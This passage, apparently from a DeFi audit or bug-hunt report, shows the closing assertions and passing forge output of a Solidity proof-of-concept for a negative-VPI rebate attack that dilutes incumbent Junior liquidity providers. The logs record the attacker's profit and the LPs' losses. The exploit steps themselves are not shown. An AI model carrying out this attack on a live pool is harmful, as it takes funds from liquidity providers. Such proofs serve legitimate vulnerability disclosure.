        emit log_named_uint("honest exiting junior proceeds (attack), USDG", a.exitingJuniorProceeds / 1e6);
        emit log_named_uint("honest exiting junior proceeds (control), USDG", c.exitingJuniorProceeds / 1e6);
        assertLt(a.exitingJuniorProceeds, c.exitingJuniorProceeds, "honest exit in the same settlement is underpaid");
        assertGt(gain, 0, "attacker nets a profit from the rebate round trip");
        assertGt(incumbentLoss, uint256(gain), "incumbents lose the LP-side transfer (gain plus the fees the attacker paid)");
        assertLt(a.incumbentJuniorValueEnd, c.incumbentJuniorValueEnd, "incumbent Junior LPs fund the gain");
    }
}
```

Output (exit 0):

```
# forge test output (compiler warnings elided)
Ran 1 test for test/poc/hunt-nav/ProofNegativeVpiRebateDepositDilution.t.sol:ProofNegativeVpiRebateDepositDilution
[PASS] test_SkewReducingRebateDilutesIncumbentJunior() (gas: 16156083)
Logs:
  rebate R (negative VPI at open), USDG: 4996
  pool totalAssets drop at open, USDG: 4996
  attacker VPI reserve after open, USDG: 4996
  junior principal at deposit pricing (attack), USDG: 1998260
  junior principal at deposit pricing (control), USDG: 2001592
  deposit shares (attack): 6008279834703137
  deposit shares (control): 5998280108988622
  pool totalAssets rise at close, USDG: 4996
  attacker cycle P&L (attack), USDG: 1264
  attacker cycle P&L (control), USDG: -83
  attacker gain from the trader legs, USDG: 1347
  incumbent junior value end (attack), USDG: 1998482
  incumbent junior value end (control), USDG: 2000564
  incumbent junior loss, USDG: 2081
  attacker position lifetime, seconds: 30
  honest exiting junior proceeds (attack), USDG: 998631
  honest exiting junior proceeds (control), USDG: 1000295

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 26.61ms (20.18ms CPU time)

Ran 1 test suite in 27.33ms (26.61ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
exit 0
```

